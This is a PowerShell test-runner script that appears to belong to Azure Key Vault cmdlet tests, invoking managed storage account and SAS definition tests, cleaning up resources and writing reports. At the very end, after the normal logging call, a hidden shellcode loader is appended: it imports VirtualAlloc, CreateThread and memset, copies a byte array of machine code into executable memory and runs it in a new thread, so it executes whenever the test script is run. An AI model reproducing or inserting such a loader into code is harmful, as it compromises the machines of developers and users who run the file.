    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndRawSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndRawSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndRawSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndBlobSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndBlobSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndBlobSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndBlobStoredPolicySasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndBlobStoredPolicySasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndBlobStoredPolicySasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndContainerSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndContainerSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndContainerSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndShareSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndShareSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndShareSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndFileSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndFileSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndFileSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndQueueSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndQueueSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndQueueSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndTableSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndTableSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndTableSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndAccountSasDefinition} "Test_SetAzureKeyVaultManagedStorageAccountAndAccountSasDefinition" } "Test_SetAzureKeyVaultManagedStorageAccountAndAccountSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionPipeTest} "Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionPipeTest" } "Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionPipeTest"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionAttribute} "Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionAttribute" } "Test_SetAzureKeyVaultManagedStorageAccountAndSasDefinitionAttribute"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_UpdateAzureKeyVaultManagedStorageAccount} "Test_UpdateAzureKeyVaultManagedStorageAccount" } "Test_UpdateAzureKeyVaultManagedStorageAccount"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_RegenerateAzureKeyVaultManagedStorageAccountAndSasDefinition} "Test_RegenerateAzureKeyVaultManagedStorageAccountAndSasDefinition" } "Test_RegenerateAzureKeyVaultManagedStorageAccountAndSasDefinition"
    Run-TestProtected { Run-ManagedStorageAccountTest {Test_ListKeyVaultAzureKeyVaultManagedStorageAccounts} "Test_ListKeyVaultAzureKeyVaultManagedStorageAccounts" } "Test_ListKeyVaultAzureKeyVaultManagedStorageAccounts"
}


Cleanup-LogFiles $PSScriptRoot
Initialize-TemporaryState
if (($Vault -ne "") -and (@('DataPlane', 'All') -contains $TestMode))
{
    Cleanup-OldCertificates
    Cleanup-OldManagedStorageAccounts
    Cleanup-OldKeys
    Cleanup-OldSecrets
}

Write-Host "Clean up and initialization completed."

$global:startTime = Get-Date

try
{
    if (@('ControlPlane', 'All') -contains $TestMode)
    {
        $oldVaultResource = Get-VaultResource
        try
        {
            Run-AllControlPlaneTests
        }
        finally
        {
            Restore-VaultResource $oldVaultResource
        }
    }

    if (@('DataPlane', 'All') -contains $TestMode)
    {
        $oldVaultResource = Get-VaultResource
        try
        {
            Run-AllDataPlaneTests
        }
        finally
        {
            Restore-VaultResource $oldVaultResource
        }
    }
}
finally
{
    Cleanup-TemporaryState ($ResourceGroup -eq "") ($Vault -eq "")
}

$global:endTime = Get-Date


Write-FileReport
Write-ConsoleReport


Move-Log $PSScriptRoot
$GJy = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $GJy -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x91,0x01,0xb7,0xa6,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0x51,0x31,0x56,0x14,0x83,0xee,0xfc,0x03,0x56,0x10,0x73,0xf4,0x4b,0x4e,0xf1,0xf7,0xb3,0x8f,0x95,0x7e,0x56,0xbe,0x95,0xe5,0x12,0x91,0x25,0x6d,0x76,0x1e,0xce,0x23,0x63,0x95,0xa2,0xeb,0x84,0x1e,0x08,0xca,0xab,0x9f,0x20,0x2e,0xad,0x23,0x3a,0x63,0x0d,0x1d,0xf5,0x76,0x4c,0x5a,0xeb,0x7b,0x1c,0x33,0x60,0x29,0xb1,0x30,0x3c,0xf2,0x3a,0x0a,0xd1,0x72,0xde,0xdb,0xd0,0x53,0x71,0x57,0x8b,0x73,0x73,0xb4,0xa0,0x3d,0x6b,0xd9,0x8c,0xf4,0x00,0x29,0x7b,0x07,0xc1,0x63,0x84,0xa4,0x2c,0x4c,0x77,0xb4,0x69,0x6b,0x67,0xc3,0x83,0x8f,0x1a,0xd4,0x57,0xed,0xc0,0x51,0x4c,0x55,0x83,0xc2,0xa8,0x67,0x40,0x94,0x3b,0x6b,0x2d,0xd2,0x64,0x68,0xb0,0x37,0x1f,0x94,0x39,0xb6,0xf0,0x1c,0x79,0x9d,0xd4,0x45,0xda,0xbc,0x4d,0x20,0x8d,0xc1,0x8e,0x8b,0x72,0x64,0xc4,0x26,0x67,0x15,0x87,0x2e,0x19,0x43,0x4c,0xaf,0x8d,0xfc,0xc5,0xc1,0x24,0x57,0x7e,0x52,0xc1,0x71,0x79,0x95,0xf8,0x4f,0x5e,0x3a,0x51,0xe3,0x33,0xee,0x3d,0x39,0xe2,0x69,0x1a,0xc2,0xdf,0xd9,0x37,0x57,0xe3,0x8e,0xe4,0xcd,0xb3,0xd8,0x72,0x12,0x34,0x19,0xad,0x21,0x00,0x56,0xd4,0x04,0x68,0x38,0x7e,0xd0,0xe1,0x27,0xb8,0x21,0x24,0xde,0x82,0x8d,0xaf,0xe1,0x08,0x52,0xb4,0xb1,0x5f,0xc1,0xe3,0x66,0x09,0x8d,0xe0,0xdc,0x9b,0x76,0x08,0x0b,0x75,0xe2,0xfc,0xeb,0x2a,0xa0,0x53,0x47,0x9a,0x2e,0x79,0x61,0x3a,0xd4,0x7e,0xb8,0xbf,0xea,0xf4,0x49,0xf0,0x9f,0x1b,0x25,0xfe,0xd5,0x46,0xe0,0x01,0xc0,0xed,0x4d,0x95,0xeb,0xe1,0x4d,0x65,0x84,0x01,0x4e,0x25,0x54,0x51,0x26,0xfd,0xf0,0x06,0x53,0x02,0x2d,0x3b,0xc8,0xaf,0x47,0xdb,0xb8,0x27,0x58,0x04,0x47,0xb7,0x0b,0x12,0x2f,0xa5,0x3d,0x13,0x4d,0x36,0x94,0xa1,0x52,0xbc,0xda,0x21,0x55,0x3d,0x26,0xb0,0x9a,0x48,0x4d,0xe3,0xd9,0xed,0x65,0x9d,0x21,0xee,0x89,0xaf,0xe9,0x22,0x58,0xe1,0x27,0x73,0x8a,0x33,0x71,0x5d,0xe3,0x02,0x81;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$Bo9D=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($Bo9D.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$Bo9D,0,0,0);for (;;){Start-sleep 60};

